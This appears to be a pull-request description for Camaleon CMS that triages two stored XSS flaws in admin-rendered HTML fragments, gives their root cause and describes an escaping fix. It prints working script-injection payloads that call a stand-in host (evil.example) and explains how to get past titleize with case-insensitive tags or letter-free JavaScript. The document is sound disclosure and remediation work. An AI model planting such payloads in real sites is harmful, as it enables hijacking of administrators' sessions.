## Why

Two stored XSS vulnerabilities remain in server-generated HTML fragments that are rendered through `raw`. Both let a non-superuser store markup that executes in an administrator's session on an ordinary admin page.

Both were found while verifying an externally reported "Stored XSS via Draft Post Title" against `master`. **That report is not reproducible** — it was fixed in 2.9.2 by [#1143](https://github.com/owen2345/camaleon-cms/pull/1143) (`PostDecorator#the_title` now escapes) and its access-control half by [#1139](https://github.com/owen2345/camaleon-cms/pull/1139). The reporter was testing a pre-2.9.2 checkout. These two defects are distinct, unreported, and sit two lines away from the code #1143 fixed.

### Triage verdict: legit

Per `docs/ai/workflows.md` Phase 2A.

**Proof of presence.** Reproduced end-to-end against `spec/dummy` on `master` at `c27dbcc4`. In both cases Nokogiri parses a live `<script>` element out of the rendered admin page — not escaped text.

**A. `PostDecorator#the_status`** — a contributor stores the payload in `posts.status`, an administrator opens the post list:

```
stored status column:  "x'><script src=//evil.example/a.js></script>"
the_status output:     "<span class='label label-default label-form'>X'><Script Src=//Evil.Example/A.Js></Script></span>"
<script> nodes in #posts-table-list: 1
  -> <script src="//Evil.Example/A.Js"></script>
```

The status column is reachable at contributor privilege. `PostsController#get_post_data` permits `:status`, `Post` has no `inclusion:` validation on it, and `status` is not in `normalize_attrs`. The only guard rewrites the exact literal `'published'` when the user cannot publish:

```
HTTP 302  (ordinary successful create by a 'contributor' with :create_post only)
created status:    "x'><script src=//evil.example/a.js></script>"
status == payload? true
```

`titleize` is not a mitigation. HTML tag and attribute names are case-insensitive and DNS hostnames are too, so `<Script Src=//Evil.Example/A.Js>` loads and executes — the attacker names the file on their own server to match. A letter-free payload (`[][(![]+[])[+[]]]`) passes through `titleize` byte-identical, so inline script works as well.

**B. `CustomFieldGroup#get_caption`** — a nav-menu or widget manager stores the payload in a model `name`, an administrator opens the custom-fields settings page:

```
NavMenu#name stored: "<script src=//evil.example/a.js></script>"
get_caption output:  "Field settings for Menus <b>(<script src=//evil.example/a.js></script>)</b>"
rendered:            <td><a href="…">Field settings for Menus <b>(<script src="//evil.example/a.js"></script>)</b></a></td>
injected <script> nodes: 1
```

No `titleize` in this path, so the payload lands verbatim.

### Root cause

Both are the same shape: **code outside a view builds an HTML string by interpolation, and a view renders it with `raw`.** [#1206](https://github.com/owen2345/camaleon-cms/pull/1206) hardened the sinks it found by escaping at the source (`the_title`), and the unreleased output-safety sweep in `0ddf2aef` converted many string-built fragments to `safe_join`/`content_tag`. These two survived both passes.

**A.** `PostDecorator#the_status` ([post_decorator.rb:168](../../../app/decorators/camaleon_cms/post_decorator.rb)) maps five canonical statuses to I18n labels and falls through to the raw column value for anything else:

```ruby
else
  color = 'default'
  status = self.status          # raw DB value
end
"<span class='label label-#{color} label-form'>#{status.titleize}</span>"
```

An injected status is by definition not canonical, so it always takes the `else` arm. Three sinks render it: `admin/posts/index.html.erb:60`, `admin/search.html.erb:55`, and `admin/posts/form.html.erb:12` — the last firing the moment an administrator opens the odd-looking post to inspect it.

**B.** `CustomFieldGroup#get_caption` ([custom_field_group.rb:125](../../../app/models/camaleon_cms/custom_field_group.rb)) builds captions in the **model**, rendered by `raw(f.get_caption)` at `admin/settings/custom_fields/index.html.erb:35`. Its `the_title` interpolations are escaped by #1206, but three model attributes are not: `Widget::Main#name`, `Theme#name`, and `NavMenu#name`. None is in `normalize_attrs` — only `:description` is, on those models.

A fourth interpolation on the same path was found while writing the reproduction spec: the `else` arm emits `object_class` itself. The placement check added by [#1217](https://github.com/owen2345/camaleon-cms/pull/1217) admits any class name paired with the current site's id — that arm exists so hook-registered models need no allow-list — so `object_class` is attacker-settable text like the names are, and it reproduces identically:

```
object_class stored: "<script src=//evil.example/a.js></script>"
get_caption output:  "Fields for <b><script src=//evil.example/a.js></script></b>"
injected <script> nodes: 1
```

It is fixed here rather than deferred: the change makes `get_caption` return a `SafeBuffer`, and leaving one interpolation unescaped in a method now declared safe is how the next regression happens.

### Privilege and impact

| | Attacker needs | Victim | Trigger |
|---|---|---|---|
| A | `:create_post` on any post type (contributor) | any administrator | the "All" tab, admin search, or opening the post |
| B | `:manage` on nav menus or widgets, plus custom-fields access | any administrator | opening custom-fields settings |

Neither requires a superuser. The admin panel is same-origin with the frontend, so script landing there runs with an administrator's session — the same privilege-escalation shape as [#1215](https://github.com/owen2345/camaleon-cms/pull/1215) and [#1217](https://github.com/owen2345/camaleon-cms/pull/1217).

## What changes

- `PostDecorator#the_status` escapes the interpolated status before returning, and returns an `ActiveSupport::SafeBuffer`.
- `CustomFieldGroup#get_caption` escapes the three unescaped model names and the `object_class` fallback, and returns a `SafeBuffer`.
- `TermTaxonomyDecorator#the_status` gets the same treatment for consistency. It emits only I18n strings today and is **not** exploitable; it is in scope because it is the same pattern in the same rendering path and leaving it invites the next regression.
- Reproducing request specs for A and B, plus a spec pinning that the `options[:status_default]` → `restore` path cannot poison the column into a rendered sink.

## Out of scope

- **No `inclusion:` validation on `Post#status`.** Considered and rejected on evidence — it does not close the hole and it breaks existing installs. Rationale and reproduction in `design.md` D2.
- **The `the_title` double-escaping** at six admin ERB sites. Cosmetic, no security dimension, and it carries a public-helper contract change; handled by `fix-admin-title-double-escaping`.
- **`href='#{the_url}'`** in `cama_sitemap_cats_generator`, `breadcrumb_draw`, and the default theme helper. The same string-built shape, but the interpolated value is a generated URL, and Rails route generation is expected to percent-encode it. Unverified either way; needs its own investigation before anyone claims a defect.
- **`nav_menu_helper.rb:144`**, which builds markup by interpolation deliberately — `0ddf2aef` documented that menu labels carry admin-authored HTML by design. Unchanged.
